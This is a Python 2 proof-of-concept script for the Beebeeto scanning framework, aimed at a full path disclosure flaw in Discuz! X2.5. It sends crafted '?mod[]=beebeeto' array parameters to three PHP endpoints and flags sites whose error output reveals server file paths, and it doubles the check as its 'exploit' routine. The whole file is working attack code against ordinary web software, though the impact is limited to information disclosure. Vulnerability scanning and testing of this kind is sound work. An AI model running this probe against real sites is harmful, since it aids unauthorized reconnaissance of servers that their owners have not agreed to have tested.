#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0075',
            'name': 'Discuz X2.5 full Path Disclosure Vulnerability POC',
            'author': '1024',
            'create_date': '2014-10-17',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Discuz',
            'vul_version': ['2.5'],
            'type': 'Information Disclosure',
            'tag': ['Discuz信息泄露', 'Discuz爆路径', 'X2.5路径泄露'],
            'desc': '''
                    Discuz! X2.5 /api.php文件中由于array_key_exists中的第一个参数只能为整数或者字符串，
                    当?mod[]=beebeeto时，$mod类型为array，从而导致array_key_exists产生错误信息。
                    ''',
            'references': ['http://www.cnseay.com/archives/2353',
                           ],
        },
    }


    @classmethod
    def verify(cls, args):
        file_list =  ['/api.php','/uc_server/control/admin/db.php','/install/include/install_lang.php']
        args['poc_ret']['file_path'] = []
        for filename in file_list:
            verify_url = args['options']['target'] + filename + '?mod[]=beebeeto'
            try:
                if args['options']['verbose']:
                    print '[*] Requst URL: ' + verify_url
                req = urllib2.urlopen(verify_url)
                content = req.read()
            except:
                continue
            if 'Warning:' in content and 'array_key_exists():' in content:
                if '.php on line'  in content:
                    args['success'] = True
                    args['poc_ret']['file_path'].append(verify_url)
        if not args['poc_ret']['file_path']:
            args['poc_ret'].pop('file_path')
            args['success'] = False
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())